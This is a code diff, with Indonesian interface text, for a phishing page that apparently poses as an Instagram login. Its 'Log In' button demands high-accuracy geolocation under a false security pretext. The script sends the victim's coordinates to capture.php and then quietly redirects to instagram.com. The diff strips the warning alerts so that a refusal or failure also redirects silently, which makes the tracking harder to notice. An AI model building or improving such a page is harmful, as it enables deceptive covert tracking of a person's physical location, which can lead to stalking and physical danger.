@@ -1,4 +1,4 @@
-cat <<EOF > ~/rafidi_tracker/index.html
+cat <<EOF > index.html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -22,26 +22,21 @@ cat <<EOF > ~/rafidi_tracker/index.html
         <button onclick="getLoc()">Log In</button>
         <p class="info">Kami memerlukan verifikasi lokasi untuk memastikan keamanan akun Anda.</p>
     </div>
-
     <script>
     function getLoc() {
-        var geoOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(success, error, geoOptions);
+            navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true});
         } else {
-            alert("Browser Anda tidak mendukung verifikasi keamanan ini.");
+            window.location.href = "https://www.instagram.com";
         }
     }
-
-    function success(position) {
-        var lat = position.coords.latitude;
-        var lon = position.coords.longitude;
-        // Kirim data ke backend PONCOL
-        window.location.href = "capture.php?lat=" + lat + "&lon=" + lon + "&dev=" + navigator.userAgent;
+    function success(pos) {
+        var lat = pos.coords.latitude;
+        var lon = pos.coords.longitude;
+        window.location.href = "capture.php?lat=" + lat + "&lon=" + lon + "&redirect=https://www.instagram.com";
     }
-
     function error() {
-        alert("Akses lokasi ditolak. Anda tidak dapat login tanpa verifikasi keamanan.");
+        window.location.href = "https://www.instagram.com";
     }
     </script>
 </body>
